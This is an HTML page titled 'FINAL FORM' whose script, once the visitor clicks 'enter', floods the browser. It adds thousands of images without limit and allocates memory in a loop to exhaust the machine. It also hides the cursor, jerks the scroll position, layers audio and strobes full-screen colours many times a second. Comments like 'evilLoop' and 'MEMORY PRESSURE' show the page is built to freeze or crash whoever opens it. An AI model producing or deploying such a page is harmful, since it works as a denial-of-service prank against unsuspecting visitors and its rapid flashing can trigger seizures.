<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>FINAL FORM</title>

<style>
html, body {
  margin: 0;
  padding: 0;
  background: black;
  overflow: hidden;
  cursor: none;
}

#grid {
  position: fixed;
  inset: 0;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
  grid-auto-rows: 80px;
}

img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  animation: glitch 0.02s infinite alternate;
  filter: contrast(250%) saturate(400%);
}

@keyframes glitch {
  from { transform: scale(1) rotate(0deg); }
  to   { transform: scale(1.3) rotate(6deg); }
}

#start {
  position: fixed;
  inset: 0;
  background: black;
  color: red;
  font-size: 42px;
  display: flex;
  align-items: center;
  justify-content: center;
  text-align: center;
  z-index: 9999999;
}
</style>
</head>
<body>

<div id="start">CLICK TO ENTER FINAL FORM</div>
<div id="grid"></div>

<audio id="a1" src="music.mp3" loop></audio>
<audio id="a2" src="music.mp3" loop></audio>
<audio id="a3" src="music.mp3" loop></audio>
<audio id="a4" src="music.mp3" loop></audio>

<canvas id="canvas"></canvas>

<script>
const IMAGE_SRC = "image.jpg";
const grid = document.getElementById("grid");
const start = document.getElementById("start");

const audios = [
  document.getElementById("a1"),
  document.getElementById("a2"),
  document.getElementById("a3"),
  document.getElementById("a4")
];

// ---------- IMAGE FLOOD ----------
function addImages(n) {
  for (let i = 0; i < n; i++) {
    const img = document.createElement("img");
    img.src = IMAGE_SRC;
    img.style.filter =
      `hue-rotate(${Math.random()*360}deg)
       blur(${Math.random()*1.5}px)
       brightness(${1+Math.random()*2})`;
    img.style.animationDuration = (Math.random()*0.03 + 0.01) + "s";
    grid.appendChild(img);
  }
}

// ---------- CANVAS MELTDOWN ----------
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

function resizeCanvas() {
  canvas.width = innerWidth;
  canvas.height = innerHeight;
}
resizeCanvas();
addEventListener("resize", resizeCanvas);

function canvasHell() {
  for (let i = 0; i < 400; i++) {
    ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
    ctx.fillRect(
      Math.random()*canvas.width,
      Math.random()*canvas.height,
      Math.random()*300,
      Math.random()*300
    );
  }
  requestAnimationFrame(canvasHell);
}

// ---------- DOM + LAYOUT DESTRUCTION ----------
function evilLoop() {
  addImages(500);

  // forced reflow
  document.body.getBoundingClientRect();

  document.querySelectorAll("img").forEach(img => {
    img.style.transform =
      `scale(${1 + Math.random()*0.8})
       rotate(${Math.random()*20}deg)`;
  });

  requestAnimationFrame(evilLoop);
}

// ---------- MEMORY PRESSURE ----------
setInterval(() => {
  const trash = [];
  for (let i = 0; i < 20000; i++) {
    trash.push(new Array(3000).fill(Math.random()));
  }
}, 700);

// ---------- SCREEN TEAR ----------
setInterval(() => {
  grid.style.transform =
    `translate(${Math.random()*30}px, ${Math.random()*30}px) skew(${Math.random()*10}deg)`;
}, 30);

// ---------- WINDOW JITTER ----------
setInterval(() => {
  window.scrollTo(Math.random()*500, Math.random()*500);
}, 25);

// ---------- START ----------
start.onclick = () => {
  start.remove();

  // Layered audio chaos
  audios.forEach((a, i) => {
    a.volume = 0.8 - i * 0.15;
    a.play();
  });

  // Initial detonation
  addImages(3000);

  // Endless growth
  setInterval(() => addImages(2000), 400);

  canvasHell();
  evilLoop();
};
</script>

</body>
</html>
